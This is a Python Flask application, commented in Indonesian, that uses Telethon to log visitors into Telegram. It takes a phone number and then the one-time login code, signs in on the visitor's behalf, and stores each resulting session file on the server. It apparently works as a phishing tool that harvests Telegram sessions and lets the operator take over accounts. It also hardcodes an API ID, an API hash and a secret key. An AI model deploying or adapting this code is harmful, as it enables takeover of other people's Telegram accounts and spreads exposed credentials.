import asyncio
import os
import logging
from flask import Flask, render_template, request, redirect, url_for, flash
from telethon import TelegramClient
import nest_asyncio

# Setup logging yang lebih detail
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('debug.log'),
        logging.StreamHandler()
    ]
)

# Aktifkan nest_asyncio untuk menangani event loop
nest_asyncio.apply()

# Buat event loop global
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Masukkan API_ID dan API_HASH Anda langsung di sini
API_ID = '20115110'
API_HASH = '192c9900730edbd7e03fe772e3f8810d'

# Secret key untuk session Flask
SECRET_KEY = 'ManusiaHebat'

# Pastikan folder untuk sesi ada
SESSION_FOLDER = "Session"
os.makedirs(SESSION_FOLDER, exist_ok=True)

app = Flask(__name__)
app.secret_key = SECRET_KEY

# Dictionary untuk menyimpan client
clients = {}

def run_async(coro):
    """Helper function untuk menjalankan coroutine."""
    try:
        logging.debug("Running async function")
        return loop.run_until_complete(coro)
    except Exception as e:
        logging.error(f"Error in run_async: {str(e)}", exc_info=True)
        raise

async def init_client(phone_number, session_file):
    """Inisialisasi client."""
    try:
        logging.debug(f"Initializing client for {phone_number}")
        if phone_number not in clients:
            logging.debug("Creating new client")
            client = TelegramClient(session_file, API_ID, API_HASH, loop=loop)
            await client.connect()
            clients[phone_number] = client
            logging.debug(f"Client created and stored in clients dictionary")
        return clients[phone_number]
    except Exception as e:
        logging.error(f"Error in init_client: {str(e)}", exc_info=True)
        raise

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        try:
            phone_number = request.form.get("phone_number").strip()
            logging.debug(f"Received phone number: {phone_number}")

            # Tambahkan +62 jika nomor tidak dimulai dengan "+"
            if not phone_number.startswith("+"):
                phone_number = "+62" + phone_number
            logging.debug(f"Formatted phone number: {phone_number}")

            # Hapus spasi atau karakter tak diinginkan
            session_file = os.path.join(SESSION_FOLDER, f"{phone_number.replace('+', '').replace(' ', '')}.session")
            logging.debug(f"Session file path: {session_file}")

            async def send_code():
                client = await init_client(phone_number, session_file)
                logging.debug("Checking if user is authorized")
                if not await client.is_user_authorized():
                    logging.debug("Sending code request")
                    await client.send_code_request(phone_number)
                logging.debug("Code request completed")

            logging.debug("Running send_code")
            run_async(send_code())
            logging.debug(f"Current clients in dictionary: {list(clients.keys())}")
            return redirect(url_for("otp", phone_number=phone_number))

        except Exception as e:
            logging.error(f"Error in index: {str(e)}", exc_info=True)
            flash(f"Terjadi kesalahan: {str(e)}")
            if phone_number in clients:
                client = clients[phone_number]
                run_async(client.disconnect())
                del clients[phone_number]
            return redirect(url_for("index"))

    return render_template("index.html")

@app.route("/otp/<phone_number>", methods=["GET", "POST"])
def otp(phone_number):
    logging.debug(f"Accessing OTP route for {phone_number}")
    logging.debug(f"Available clients: {list(clients.keys())}")

    if phone_number not in clients:
        logging.error(f"Session not found for {phone_number}")
        flash("Sesi tidak ditemukan. Mulai ulang.")
        return redirect(url_for("index"))

    if request.method == "POST":
        try:
            otp = request.form.get("otp").strip()
            logging.debug(f"Received OTP for {phone_number}")
            client = clients[phone_number]

            async def verify_code():
                logging.debug("Starting OTP verification")
                await client.sign_in(phone_number, otp)
                logging.debug("Sign in successful")
                user = await client.get_me()
                logging.debug(f"Got user info: {user.first_name}")
                await client.disconnect()
                logging.debug("Client disconnected")
                return user.first_name if user.first_name else "Pengguna"

            user_name = run_async(verify_code())
            flash(f"Tersedia {user_name} ({phone_number}).")
            logging.debug(f"Authentication successful for {user_name}")

            # Bersihkan client
            if phone_number in clients:
                del clients[phone_number]
                logging.debug(f"Removed client for {phone_number}")

            return redirect(url_for("index"))

        except Exception as e:
            logging.error(f"Error in OTP verification: {str(e)}", exc_info=True)
            flash(f"OTP salah atau terjadi kesalahan: {str(e)}")

            # Bersihkan client jika terjadi error
            if phone_number in clients:
                run_async(client.disconnect())
                del clients[phone_number]
                logging.debug(f"Removed client for {phone_number} due to error")
            return redirect(url_for("index"))

    return render_template("otp.html", phone_number=phone_number)

@app.errorhandler(Exception)
def handle_error(error):
    logging.error(f"Unhandled error: {str(error)}", exc_info=True)
    flash("Terjadi kesalahan, coba lagi nanti.")
    return redirect(url_for("index"))

if __name__ == "__main__":
    try:
        logging.info("Starting Flask application")
        app.run(host="0.0.0.0", port=5000, debug=False)
    except Exception as e:
        logging.error(f"Error starting application: {str(e)}", exc_info=True)
    finally:
        # Cleanup saat aplikasi berhenti
        logging.info("Shutting down application")
        for phone, client in clients.items():
            try:
                run_async(client.disconnect())
                logging.debug(f"Disconnected client for {phone}")
            except Exception as e:
                logging.error(f"Error disconnecting client {phone}: {str(e)}")
        loop.close()
        logging.info("Application shutdown complete")
